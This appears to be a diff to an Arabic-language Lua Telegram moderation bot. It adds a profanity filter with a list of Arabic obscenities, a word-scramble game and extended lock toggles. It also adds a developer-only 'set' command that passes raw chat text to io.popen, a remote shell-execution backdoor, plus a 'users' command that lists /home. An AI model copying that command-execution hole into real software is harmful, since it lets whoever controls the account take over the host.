@@ -2399,6 +2399,22 @@ print_del_msg("Deleted Because [Lock] [keed_link]")
 end
 end
 end
+if msg.content_.text_ then
+text = msg.content_.text_
+if text:match("كس") or text:match("طيز") or text:match("ديس") or text:match("زب") or text:match("انيجمك") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("اخ الكحبه") or text:match("اخو الكحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") then
+if redis:get(KEEPER.."keed_fosh"..msg.chat_id_) then
+local id = msg.id_
+local msgs = {
+[0] = id
+}
+local chat = msg.chat_id_
+delete_msg(chat, msgs)
+HTTPS.request("https://api.telegram.org/bot" .. KEEPER_TOKEN .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
+redis:sadd(KEEPER..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
+print_del_msg("Deleted Because [Lock] [keed_fosh]")
+end
+end
+end
 if msg.content_.caption_ then
 text = msg.content_.caption_
 if text and text:match("(.*)(@)(.*)")  then
@@ -2664,21 +2680,6 @@ end
 if is_gbanned(msg.sender_user_id_) then
 chat_kick(msg.chat_id_, msg.sender_user_id_)
 return
-end
-if redis:get(KEEPER.."bot:muteall" .. msg.chat_id_) then
-local id = msg.id_
-local msgs = {
-[0] = id
-}
-local chat = msg.chat_id_
-if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
-delete_msg(chat, msgs)
-print_del_msg("Deleted Because [Lock] [All]")
-end
-if msg.sender_user_id_ == 483853712 then
-delete_msg(chat, msgs)
-print_del_msg("Deleted Because [Lock] [All]")
-end
 end
 if redis:get(KEEPER.."bot:muteall:Time" .. msg.chat_id_) then
 local start_ = redis:get(KEEPER.."bot:muteall:start" .. msg.chat_id_)
@@ -5999,6 +6000,10 @@ send(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
 end
 resolve_username(ap[2],delallrtb)
 end
+
+
+
+
 --------------------------------------------------------------------
 if text:match("^حذف كل الرتب (%d+)$") and is_monshi(msg.sender_user_id_, msg.chat_id_) then
 local ap = {string.match(text, "^(حذف كل الرتب) (%d+)$")}
@@ -6044,7 +6049,192 @@ delete_msg(msg.chat_id_, {
 })
 delete_msg(msg.chat_id_, msgs)
 end end
---------------------------------------------------------------------------------------
+------------------------------------------------
+-----------------------------------------------
+
+if text == 'اللعبه' and is_owner(msg.sender_user_id_, msg.chat_id_) then
+if redis:get(KEEPER.."lock_GEM"..msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, "💬┊ اللعبه معطله\n ‏ ", 1, "md")
+return false end
+local user_info_ = redis:get(KEEPER.."user:Name" .. msg.sender_user_id_)
+local UserKeeper = user_info_
+if user_info_ then
+redis:set(KEEPER..'kk1'..msg.sender_user_id_..''..msg.chat_id_..'','kk')
+send(msg.chat_id_, 0, 1, '👨‍✈️» اهلا ['..UserKeeper..'] \n™️» في لعبه السرعه\n⚠️» ارسل ( بدء اللعبه ) للعب\n✓',1, 'md')
+return false end end
+if text == 'بدء اللعبه'  and is_owner(msg.sender_user_id_, msg.chat_id_) and redis:get(KEEPER..'kk1'..msg.sender_user_id_..''..msg.chat_id_..'') then
+redis:set(KEEPER..'kk11'..msg.chat_id_..'','kkk')
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n(ق , ر , ب , ا , ي , ن , ط)',1, 'md')
+return false end
+if text then
+local kkkk = redis:get(KEEPER..'kk11'..msg.chat_id_..'')
+if kkkk == 'kkk' then
+if text == 'قرنابيط' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'kk11'..msg.chat_id_..'')
+sleep(1.5)
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n ( ط ، ي ، م )',1, 'md')
+redis:set(KEEPER..'kk111'..msg.chat_id_..'','kkkk')
+return false end end end
+if text then
+local kkkkk = redis:get(KEEPER..'kk111'..msg.chat_id_..'')
+if kkkkk == 'kkkk' then
+if text == 'مطي' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'kk111'..msg.chat_id_..'')
+sleep(1.5)
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n ( ن ، س ، ف )',1, 'md')
+redis:set(KEEPER..'kk1111'..msg.chat_id_..'','kkkkk')
+return false end end end
+if text then
+local kkkkkk = redis:get(KEEPER..'kk1111'..msg.chat_id_..'')
+if kkkkkk == 'kkkkk' then
+if text == 'سفن' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'kk1111'..msg.chat_id_..'')
+sleep(1.5)
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n ( ط ، ش، ر ،ي )',1, 'md')
+redis:set(KEEPER..'w1'..msg.chat_id_..'','q1')
+return false end end end
+if text then
+local kkkkk = redis:get(KEEPER..'w1'..msg.chat_id_..'')
+if kkkkk == 'q1' then
+if text == 'طرشي' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'w1'..msg.chat_id_..'')
+sleep(1.5)
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n ( ا ، د ، ج ، ج )',1, 'md')
+redis:set(KEEPER..'w2'..msg.chat_id_..'','q2')
+return false end end end
+if text then
+local kkkkkk = redis:get(KEEPER..'w2'..msg.chat_id_..'')
+if kkkkkk == 'q2' then
+if text == 'دجاج' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'w2'..msg.chat_id_..'')
+sleep(1.5)
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n ( ل ، ح ، م )',1, 'md')
+redis:set(KEEPER..'w3'..msg.chat_id_..'','q3')
+return false end end end
+if text then
+local kkkkkk = redis:get(KEEPER..'w3'..msg.chat_id_..'')
+if kkkkkk == 'q3' then
+if text == 'لحم' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'w3'..msg.chat_id_..'')
+sleep(1.5)
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n ( ق ، ر ، و ، ي )',1, 'md')
+redis:set(KEEPER..'w4'..msg.chat_id_..'','q4')
+return false end end end
+if text then
+local kkkkk = redis:get(KEEPER..'w4'..msg.chat_id_..'')
+if kkkkk == 'q4' then
+if text == 'قوري' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'w4'..msg.chat_id_..'')
+sleep(1.5)
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n ( ا ،ت ، ح، ف، ه )',1, 'md')
+redis:set(KEEPER..'w5'..msg.chat_id_..'','q5')
+return false end end end
+if text then
+local kkkkkk = redis:get(KEEPER..'w5'..msg.chat_id_..'')
+if kkkkkk == 'q5' then
+if text == 'تفاحه' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'w5'..msg.chat_id_..'')
+sleep(1.5)
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n(ك , ش , ب , ا)',1, 'md')
+redis:set(KEEPER..'w6'..msg.chat_id_..'','q6')
+return false end end end
+if text then
+local kkkkk = redis:get(KEEPER..'w6'..msg.chat_id_..'')
+if kkkkk == 'q6' then
+if text == 'شباك' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'w6'..msg.chat_id_..'')
+sleep(1.5)
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n( ك ، ي ، ر ، س )',1, 'md')
+redis:set(KEEPER..'w7'..msg.chat_id_..'','q7')
+return false end end end
+if text then
+local kkkkkk = redis:get(KEEPER..'w7'..msg.chat_id_..'')
+if kkkkkk == 'q7' then
+if text == 'كرسي' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'w7'..msg.chat_id_..'')
+sleep(1.5)
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n( ا ،س ، ة، ي، ر )',1, 'md')
+redis:set(KEEPER..'w8'..msg.chat_id_..'','q8')
+return false end end end
+if text then
+local kkkkkk = redis:get(KEEPER..'w8'..msg.chat_id_..'')
+if kkkkkk == 'q8' then
+if text == 'سياره' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'w8'..msg.chat_id_..'')
+sleep(1.5)
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n( ن ،ص، و، ك، د)',1, 'md')
+redis:set(KEEPER..'w9'..msg.chat_id_..'','q9')
+return false end end end
+if text then
+local kkkkk = redis:get(KEEPER..'w9'..msg.chat_id_..'')
+if kkkkk == 'q9' then
+if text == 'صندوك' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'w9'..msg.chat_id_..'')
+sleep(1.5)
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n( ك ، ر ، ي )',1, 'md')
+redis:set(KEEPER..'w00'..msg.chat_id_..'','q00')
+return false end end end
+if text then
+local kkkkkk = redis:get(KEEPER..'w00'..msg.chat_id_..'')
+if kkkkkk == 'q00' then
+if text == 'ركي' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'w00'..msg.chat_id_..'')
+sleep(1.5)
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n( ل ، ف ، ي )',1, 'md')
+redis:set(KEEPER..'a1'..msg.chat_id_..'','s1')
+return false end end end
+if text then
+local kkkkk = redis:get(KEEPER..'a1'..msg.chat_id_..'')
+if kkkkk == 's1' then
+if text == 'فيل' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'a1'..msg.chat_id_..'')
+sleep(1.5)
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n( ظ ، ن ، ه، ا، ر)',1, 'md')
+redis:set(KEEPER..'a2'..msg.chat_id_..'','s2')
+return false end end end
+if text then
+local kkkkkk = redis:get(KEEPER..'a2'..msg.chat_id_..'')
+if kkkkkk == 's2' then
+if text == 'نظاره' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'a2'..msg.chat_id_..'')
+sleep(1.5)
+send(msg.chat_id_, 0, 1, '• رتب الكلمه  التاليه \n( ت ، ا ، ك، ب )',1, 'md')
+redis:set(KEEPER..'a3'..msg.chat_id_..'','s3')
+return false end end end
+if text then
+local kkkkkk = redis:get(KEEPER..'a3'..msg.chat_id_..'')
+if kkkkkk == 's3' then
+if text == 'كتاب' then
+send(msg.chat_id_, msg.id_, 1, '• اجابتك صحيحه 👏🏻',1, 'md')
+redis:del(KEEPER..'a3'..msg.chat_id_..'')
+sleep(2)
+send(msg.chat_id_, msg.id_, 1, '🎟┊ انتهت اللعبه شكرا لتفاعلكم',1, 'md')
+return false end end end
+-------------------------------------------------------------------------------------
+if text == 'تفعيل اللعبه' and is_owner(msg.sender_user_id_, msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, "💬┊ بواسطه » "..tmkeeper(msg).."\n🎟┊ تم تفعيل اللعبه\n ✓ ", 1, 'md')
+redis:del(KEEPER.."lock_GEM"..msg.chat_id_)
+end
+if text == 'تعطيل اللعبه' and is_owner(msg.sender_user_id_, msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, "💬┊ بواسطه » "..tmkeeper(msg).."\n🎟┊ تم تعطيل استخدام اللعبه\n ✓ ", 1, 'md')
+redis:set(KEEPER.."lock_GEM"..msg.chat_id_, true)
+end 
+------------------------------------------------------------------------------
 if text == 'تفعيل الملصقات' and is_owner(msg.sender_user_id_, msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, "💬┊ بواسطه » "..tmkeeper(msg).."\n🎟┊ تم تفعيل ردود الملصقات\n ✓ ", 1, 'md')
 redis:del(KEEPER.."lock_STCK"..msg.chat_id_)
@@ -6052,7 +6242,7 @@ end
 if text == 'تعطيل الملصقات' and is_owner(msg.sender_user_id_, msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, "💬┊ بواسطه » "..tmkeeper(msg).."\n🎟┊ تم تعطيل ردود الملصقات\n ✓ ", 1, 'md')
 redis:set(KEEPER.."lock_STCK"..msg.chat_id_, true)
-end
+end 
 -------------------welcome on---------------------------------------------------------
 if text:match("^تفعيل الترحيب$") and is_momod(msg.sender_user_id_, msg.chat_id_) then
 redis:set(KEEPER..'status:welcome:'..msg.chat_id_,'enable')
@@ -6083,6 +6273,23 @@ send(msg.chat_id_, msg.id_, 1, '💲┊ للمطور الاساسي فقــــ
 else
 redis:setex(KEEPER..'Kpch'..msg.sender_user_id_,300,true)
 send(msg.chat_id_, msg.id_, 1, "🌀┊ ارسل لـي معرف قناتك 🍃\n",1, 'html')
+end end
+
+--------------------------------------------------
+if text:match('^users$') then
+if not is_KP(msg) then
+send(msg.chat_id_, msg.id_, 1, '💲┊ للمطور الاساسي فقــــــــط', 1, 'md')
+else
+local users = io.popen("cd /home && ls"):read("*all")
+send(msg.chat_id_, msg.id_, 1, '🌀┊ يوزرات الـــروت \n---------------\n'..users..'', 1, 'md')
+end end
+if text:match("^set (.*)$") then
+local txt = {string.match(text, "^(set) (.*)$")}
+if not is_KP(msg) then
+send(msg.chat_id_, msg.id_, 1, '💲┊ للمطور الاساسي فقــــــــط', 1, 'md')
+else
+local pp = ''..txt[2]..''
+io.popen(pp)
 end end
 -----------------ADD Join------------------------------
 if text == 'تفعيل الاشتراك الاجباري' then
@@ -7319,8 +7526,8 @@ getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),cb)
 end
 end
 ----------------LOCK FOSHN--------------------------------------------------
-if text:match("كس") or text:match("طيز") or text:match("ديس") or text:match("زب") or text:match("انيجمك") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("اخ الكحبه") or text:match("اخو الكحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") and is_owner(msg.sender_user_id_, msg.chat_id_) then
-if redis:get(KEEPER.."ffosh"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
+if text:match("كس") or text:match("طيز") or text:match("ديس") or text:match("زب") or text:match("انيجمك") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("اخ الكحبه") or text:match("اخو الكحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") and is_momod(msg.sender_user_id_, msg.chat_id_) then
+if redis:get(KEEPER.."ffosh"..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
 local id = msg.id_
 local msgs = { [0] = id}
 local chat = msg.chat_id_
@@ -7453,6 +7660,7 @@ local text = [[
 🗯 ┇ الفايلات ⌯ الدردشه
 🗯 ┇ المتحركه ⌯ العربيـه
 🗯 ┇ الصوت ⌯ الانكليزيـه
+🗯 ┇ الفشـــــــــــار
 🗯 ┇ الملصقات ⌯ الاغانـي
 ⚜️ ┇ التوجيـه ⌯ الماركدون
 ⚜️ ┇ المعرف ⌯ الكل
@@ -7481,6 +7689,8 @@ local text = [[
 ⚜️ ┇ مسح الردود
 ⚜️ ┇ تفعيل اطردني
 ⚜️ ┇ تعطـيل اطردني
+⚜️ ┇ تفعيل اللعبه
+⚜️ ┇ تعطـيل اللعبه
 
 🔍 ┇ تفعيل الردود
 🔍 ┇ تعطيل الردود
@@ -7488,6 +7698,7 @@ local text = [[
 🔍 ┇ تعطيل رفع المميز
 🔍 ┇ تفعيل رفع الادمن
 🔍 ┇ تعطيل رفع الادمن
+🔍 ┇ اللعبه - بدء العبه
 🔍 ┇ رفع ادمن بالتفاعل + العدد
 🔍 ┇ رفع مميز بالتفاعل + العدد
 🔍 ┇ تفعيل التثبيت
@@ -7818,8 +8029,22 @@ send(msg.chat_id_, msg.id_, 1, "💬┊ تم قفل الكل \n🎟┊ الأم�
 else
 send(msg.chat_id_, msg.id_, 1,  "💬┊ الكل مقفوله سابقا \n🎟┊ الأمر بواسطه » "..tmkeeper(msg).."\n ‏ ", 1, "md")
 end
-redis:set(KEEPER.."bot:muteall" .. msg.chat_id_, true)
-redis:set(KEEPER.."bot:gtime:say" .. msg.chat_id_, true, true)
+redis:set(KEEPER.."bot:bots:mute" .. msg.chat_id_, true)
+redis:set(KEEPER.."anti-flood:" .. msg.chat_id_, true)
+redis:set(KEEPER.."bot:text:mute" .. msg.chat_id_, true)
+redis:set(KEEPER.."bot:photo:mute" .. msg.chat_id_, true)
+redis:set(KEEPER.."bot:video:mute" .. msg.chat_id_, true)
+redis:set(KEEPER.."bot:selfvideo:mute" .. msg.chat_id_, true)
+redis:set(KEEPER.."bot:document:mute" .. msg.chat_id_, true)
+redis:set(KEEPER.."markdown:lock" .. msg.chat_id_, true)
+redis:set(KEEPER.."bot:gifs:mute" .. msg.chat_id_, true)
+redis:set(KEEPER.."bot:music:mute" .. msg.chat_id_, true)
+redis:set(KEEPER.."bot:voice:mute" .. msg.chat_id_, true)
+redis:set(KEEPER.."tags:lock" .. msg.chat_id_, true)
+redis:set(KEEPER.."bot:contact:mute" .. msg.chat_id_, true)
+redis:set(KEEPER.."bot:tgservice:mute" .. msg.chat_id_, true)
+redis:set(KEEPER.."bot:forward:mute" .. msg.chat_id_, true)
+redis:set(KEEPER.."ffosh"..msg.chat_id_, true)
 end
 if lockKeeper[2] == "الدردشه" then
 if not redis:get(KEEPER.."bot:text:mute" .. msg.chat_id_) then
@@ -8110,8 +8335,22 @@ send(msg.chat_id_, msg.id_, 1, "💬┊ تم فتح الكل \n🎟┊ الأم�
 else
 send(msg.chat_id_, msg.id_, 1,  "💬┊ الكل مفتوحه سابقا\n🎟┊ الأمر بواسطه » "..tmkeeper(msg).."\n ‏ ", 1, "md")
 end
-redis:del(KEEPER.."bot:muteall" .. msg.chat_id_)
-redis:set(KEEPER.."bot:gtime:say" .. msg.chat_id_, true)
+redis:del(KEEPER.."bot:bots:mute" .. msg.chat_id_)
+redis:del(KEEPER.."anti-flood:" .. msg.chat_id_)
+redis:del(KEEPER.."bot:text:mute" .. msg.chat_id_)
+redis:del(KEEPER.."bot:photo:mute" .. msg.chat_id_)
+redis:del(KEEPER.."bot:video:mute" .. msg.chat_id_)
+redis:del(KEEPER.."bot:selfvideo:mute" .. msg.chat_id_)
+redis:del(KEEPER.."bot:document:mute" .. msg.chat_id_)
+redis:del(KEEPER.."markdown:lock" .. msg.chat_id_)
+redis:del(KEEPER.."bot:gifs:mute" .. msg.chat_id_)
+redis:del(KEEPER.."bot:music:mute" .. msg.chat_id_)
+redis:del(KEEPER.."bot:voice:mute" .. msg.chat_id_)
+redis:del(KEEPER.."tags:lock" .. msg.chat_id_)
+redis:del(KEEPER.."bot:contact:mute" .. msg.chat_id_)
+redis:del(KEEPER.."bot:tgservice:mute" .. msg.chat_id_)
+redis:del(KEEPER.."bot:forward:mute" .. msg.chat_id_)
+redis:del(KEEPER.."ffosh"..msg.chat_id_)
 end
 if UNkeeper[2] == "الدردشه" then
 if redis:get(KEEPER.."bot:text:mute" .. msg.chat_id_) then
@@ -8484,6 +8723,14 @@ send(msg.chat_id_, msg.id_, 1,  "💬┊ البوتات بالتقييد مقف�
 end
 redis:set(KEEPER.."keed_bots" .. msg.chat_id_, true)
 end
+if is_momod(msg.sender_user_id_, msg.chat_id_) and text == "قفل الفشار بالتقييد" then
+if not redis:get(KEEPER.."keed_fosh" .. msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, "💬┊ تم قفل الفشار بالتقييد \n🎟┊ الأمر بواسطه » "..tmkeeper(msg).."\n ‏ ", 1, "md")
+else
+send(msg.chat_id_, msg.id_, 1, "💬┊ الفشار بالتقييد مقفول \n🎟┊ الأمر بواسطه » "..tmkeeper(msg).."\n ‏ ", 1, "md")
+end
+redis:set(KEEPER.."keed_fosh" .. msg.chat_id_, true) 
+end 
 ----------------------------------------------------------------------------------------
 if is_momod(msg.sender_user_id_, msg.chat_id_) and text == "فتح الدردشه بالتقييد" then
 if redis:get(KEEPER.."keed_text" .. msg.chat_id_) then
@@ -8629,8 +8876,17 @@ send(msg.chat_id_, msg.id_, 1,  "💬┊ البوتات بالتقييد مفت�
 end
 redis:del(KEEPER.."keed_bots" .. msg.chat_id_)
 end
+if is_momod(msg.sender_user_id_, msg.chat_id_) and text == "فتح الفشار بالتقييد" then
+if redis:get(KEEPER.."keed_fosh" .. msg.chat_id_) then
+send(msg.chat_id_, msg.id_, 1, "💬┊ تم فتح الفشار بالتقييد \n🎟┊ الأمر بواسطه » "..tmkeeper(msg).."\n ‏ ", 1, "md")
+else
+send(msg.chat_id_, msg.id_, 1, "💬┊ الفشار بالتقييد مفتوح \n🎟┊ الأمر بواسطه » "..tmkeeper(msg).."\n ‏ ", 1, "md")
+end
+redis:del(KEEPER.."keed_fosh" .. msg.chat_id_)
+end
 if is_momod(msg.sender_user_id_, msg.chat_id_) and idf:match("-100(%d+)") and (text:match("^قفل الكل بالتقييد"))  then
 redis:set(KEEPER.."keed_bots" .. msg.chat_id_,true)
+redis:set(KEEPER.."keed_fosh" .. msg.chat_id_, true)
 redis:set(KEEPER.."keed_fwd" .. msg.chat_id_,true)
 redis:set(KEEPER.."lock_stecker" .. msg.chat_id_,true)
 redis:set(KEEPER.."keed_english" .. msg.chat_id_,true)
@@ -8650,6 +8906,7 @@ send(msg.chat_id_, msg.id_, 1, "💬┊ تم قفل الكل بالتقييد \n
 end
 if is_momod(msg.sender_user_id_, msg.chat_id_) and idf:match("-100(%d+)") and (text:match("^فتح الكل بالتقييد"))  then
 redis:del(KEEPER.."keed_bots" .. msg.chat_id_)
+redis:del(KEEPER.."keed_fosh" .. msg.chat_id_)
 redis:del(KEEPER.."keed_fwd" .. msg.chat_id_)
 redis:del(KEEPER.."lock_stecker" .. msg.chat_id_)
 redis:del(KEEPER.."keed_english" .. msg.chat_id_)
@@ -8673,6 +8930,11 @@ if redis:get(KEEPER.."keed_bots" .. msg.chat_id_) then
 keed_bots = "✅"
 else
 keed_bots = "✖️"
+end
+if redis:get(KEEPER.."keed_fosh" .. msg.chat_id_) then
+keed_fosh = "✅"
+else
+keed_fosh = "✖️"
 end
 if redis:get(KEEPER.."keed_fwd" .. msg.chat_id_) then
 keed_fwd = "✅"
@@ -8754,7 +9016,8 @@ keed_text = "✅"
 else
 keed_text = "✖️"
 end
-local keed_helps = "- *اعدادات التقييد في المجموعه»*\n\n🎟┊ الروابط بالتقييد     » "..keed_link.."\n🏗┊ الدردشه بالتقييد   » "..keed_text.."\n🏗┊ الصور بالتقييد      » "..keed_photo.."\n🏗┊ الملصقات بالتقييد » "..lock_stecker.."\n🎟┊ المتحركه بالتقييد  » "..keed_gif.."\n💯┊ الاغاني بالتقييد     » "..keed_audio.."\n💯┊ الصوت بالتقييد    » "..keed_voice.."\n💯┊ المعرف بالتقييد    » "..keed_user.."\n🎟┊ الهاشتاك بالتقييد  » "..keed_hashtag.."\n💯┊ البوتات بالتقييد     » "..keed_bots.."\n💯┊ التوجيه بالتقييد     » "..keed_fwd.."\n💯┊ الملفات بالتقييد    » "..keed_Document.."\n🎟┊ الاتصال بالتقييد     » "..keed_contect.."\n🏗┊ العربيه بالتقييد      » "..keed_arbic.."\n🏗┊ الانكليزيه بالتقييد   » "..keed_english.."\n🏗┊ الفيديو بالتقييد     » "..keed_video.."\n🎟┊ الماركدون بالتقييد » "..keed_markdon.."\n\n🗳┊ تابع » [@keeper_ch]\n ‌‏"send(msg.chat_id_, msg.id_, 1, keed_helps, 1, "md")
+local keed_helps = "- *اعدادات التقييد في المجموعه»*\n\n🎟┊ الروابط بالتقييد     » "..keed_link.."\n🏗┊ الدردشه بالتقييد   » "..keed_text.."\n🏗┊ الصور بالتقييد      » "..keed_photo.."\n🏗┊ الملصقات بالتقييد » "..lock_stecker.."\n🎟┊ المتحركه بالتقييد  » "..keed_gif.."\n💯┊ الفشار بالتقييد     » "..keed_fosh.."\n💯┊ الاغاني بالتقييد     » "..keed_audio.."\n💯┊ الصوت بالتقييد    » "..keed_voice.."\n💯┊ المعرف بالتقييد    » "..keed_user.."\n🎟┊ الهاشتاك بالتقييد  » "..keed_hashtag.."\n💯┊ البوتات بالتقييد     » "..keed_bots.."\n💯┊ التوجيه بالتقييد     » "..keed_fwd.."\n💯┊ الملفات بالتقييد    » "..keed_Document.."\n🎟┊ الاتصال بالتقييد     » "..keed_contect.."\n🏗┊ العربيه بالتقييد      » "..keed_arbic.."\n🏗┊ الانكليزيه بالتقييد   » "..keed_english.."\n🏗┊ الفيديو بالتقييد     » "..keed_video.."\n🎟┊ الماركدون بالتقييد » "..keed_markdon.."\n\n🗳┊ تابع » [@keeper_ch]\n ‌‏"
+send(msg.chat_id_, msg.id_, 1, keed_helps, 1, "md")
 end
 ----------------------------------------------------------------------------------------------------------------
 if is_momod(msg.sender_user_id_, msg.chat_id_) and idf:match("-100(%d+)") and text:match("^ضع عدد احرف (%d+)$") then
